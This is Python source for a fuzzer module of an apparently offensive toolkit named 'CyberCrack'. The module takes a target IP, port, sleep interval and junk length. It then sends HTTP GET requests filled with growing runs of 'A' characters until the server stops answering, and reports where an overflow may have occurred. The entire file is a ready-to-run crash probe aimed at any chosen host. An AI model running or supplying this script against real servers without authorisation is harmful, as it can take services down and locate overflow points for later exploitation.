import socket
import time
from colorama import *
init()
red = Fore.RED
reset = Fore.RESET
def fuzzer():
    def Fuzzer_Help():
        print(r"""
        : THOST       | Target Ip |                            Necessary 
        : TPORT       | Target Port |                          Necessary 
        : SLEEP       | Time for the program to sleep |        Necessary
        : JUNK_LENGTH | Data size send to the server |         Necessary
        : Main()      | Return to main shell |                 Optional
         """)

    while True:
        try:
            Fuzzer_command = input("\nCyberCrack: CyberCrack/exploits/fuzzer > ")
            if Fuzzer_command.lower() == "help":
                Fuzzer_Help()
            elif "THOST " in Fuzzer_command:
                target_ip = Fuzzer_command.replace("THOST ", "")
                print("THOST = " + str(target_ip))
            elif "TPORT " in Fuzzer_command:
                target_port = Fuzzer_command.replace("TPORT ", "")
                print("TPORT = " + str(target_port))
            elif "SLEEP " in Fuzzer_command:
                sleep = Fuzzer_command.replace("SLEEP ", "")
                print("SLEEP = " + str(sleep))
            elif "JUNK_LENGTH " in Fuzzer_command:
                lenght = Fuzzer_command.replace("JUNK_LENGTH ", "")
                print("JUNK_LENGTH = " + str(lenght))
            elif Fuzzer_command == "show options":
                print(r"""
                                : JUNK_LENGTH 'buffer size'
                                : SLEEP 'time to rest'
                                : TPORT 'target port'
                                : THOST 'target host'
                                """)
            elif Fuzzer_command.lower() == "main()":
                break
            elif Fuzzer_command == "Exploit" or Fuzzer_command == "run":
                try:
                    buff_size = int(lenght)
                    check = int(lenght)
                    while True:
                        try:
                            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            conn.connect((target_ip, int(target_port)))
                            junk = "A" * buff_size
                            payload = "GET " + junk + " HTTP/1.1\r\n\r\n"
                            conn.send(payload.encode("raw_unicode_escape"))
                            buff_size += int(lenght)
                            print("\r[+] Payload sent. " + str(buff_size) + " data sent", end="")
                            conn.close()
                            time.sleep(int(sleep))
                        except WindowsError:
                            if buff_size == check:
                                print("\r[+] Check the ip, port or if the server is down because an error occured",
                                      end="")
                                break
                            else:
                                print("\r[+] An overflow might occured at  " + str(buff_size), end="")
                                break
                except NameError:
                    print(red + "Assign all values related to this exploit" + reset)
                    continue
                except KeyboardInterrupt:
                    break
                except ValueError:
                    print("Invalid sleep time")
                    continue
            else:
                print(red + "Invalid Syntax" + reset)
        except NameError:
            print(red + "Set all parameters type show options for more info" + reset)